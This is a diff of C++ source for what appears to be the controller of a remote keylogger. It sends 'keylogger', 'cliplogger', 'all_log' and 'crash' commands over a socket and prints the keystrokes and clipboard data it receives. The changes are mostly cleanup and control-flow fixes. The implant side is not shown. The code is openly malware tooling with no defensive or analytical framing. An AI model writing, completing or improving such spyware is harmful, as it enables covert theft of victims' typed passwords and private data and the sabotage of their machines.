@@ -5,7 +5,6 @@
 #include <unistd.h>
 #include <cstring>
 #include <string>
-#include <thread>
 
 #define BLUE     "\033[34m"
 #define GREEN    "\033[32m"
@@ -28,11 +27,11 @@ void logo() {
 
 int cmd(const char *str) {
     if (!strcmp(str, "pwd")) return 1;
-    else if (!strcmp(str, "keylogger")) return 1;
+    else if (!strcmp(str, "keylogger"))  return 1;
     else if (!strcmp(str, "cliplogger")) return 1;
-    else if (!strcmp(str, "all_log")) return 1;
-    else if (!strcmp(str, "crash")) return 1;
-    else if (!strcmp(str, "!q")) return 1;
+    else if (!strcmp(str, "all_log"))    return 1;
+    else if (!strcmp(str, "crash"))      return 1;
+    else if (!strcmp(str, "!q"))         return 1;
     else if (!strcmp(str, "help")) {
         std::cout << "Command List" << std::endl;
         std::cout << "\tpwd        - view current directory" << std::endl;
@@ -91,9 +90,7 @@ int main() {
         fgets(send_buf, sizeof(send_buf), stdin);
         send_buf[strcspn(send_buf, "\r\n")] = 0;
 
-        if (cmd(send_buf) == 2) {
-            continue;
-        }
+        if (cmd(send_buf) == 2) continue;
         else if (cmd(send_buf) != 1) {
             std::cout << "not found!" << std::endl;
             continue;
@@ -105,14 +102,17 @@ int main() {
         if (!strcmp(send_buf, "keylogger")) {
             std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
             keylog(connect, recv_buf);
+            continue;
         }
         else if (!strcmp(send_buf, "cliplogger")) {
             std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
             keylog(connect, recv_buf);
+            continue;
         }
         else if (!strcmp(send_buf, "all_log")) {
             std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
             keylog(connect, recv_buf);
+            continue;
         }
         else if (!strcmp(send_buf, "crash")) {
             std::cout << BLUE << "\nMy pc was destroyed lol.\n" << NC << std::endl;
@@ -123,7 +123,6 @@ int main() {
 
         std::cout << recv_buf << std::endl;
         memset(recv_buf, 0, MAX*sizeof(recv_buf[0]));
-        recv_buf[MAX] = {0};
     }
 
     close(connect);
